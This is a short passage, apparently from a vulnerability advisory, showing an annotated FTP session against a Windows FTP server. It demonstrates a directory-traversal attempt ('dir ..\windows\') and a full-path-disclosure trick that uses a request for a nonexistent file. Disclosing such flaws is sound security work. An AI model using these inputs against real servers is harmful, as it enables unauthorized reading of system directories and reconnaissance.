ftp> pwd
257 "/" is working directory                                          //[i'm
standing on the ftp root directory]
ftp> dir
200 Port command successful
150 Opening ASCII data connection
drw-r--r--   1 user     group           0 Apr 26 18:29 tesstdir
-rw-r--r--   1 user     group           0 Apr 26 18:29 testfile.txt

257 "/" is working directory                                         //[i'm
still there...]
ftp> dir ..\windows\

##[Full Path Disclosure:]
The attacker can get the full-path to his root directory by trying to GET
file that don't exist, E.g:
#
ftp> get
Remote file: none_exist_file
Local file: none_exist_file
200 Port command successful
550 Requested file not found c:\server\none_exist_file             //[In the
Error we can see the full-path to the ftp root directory]
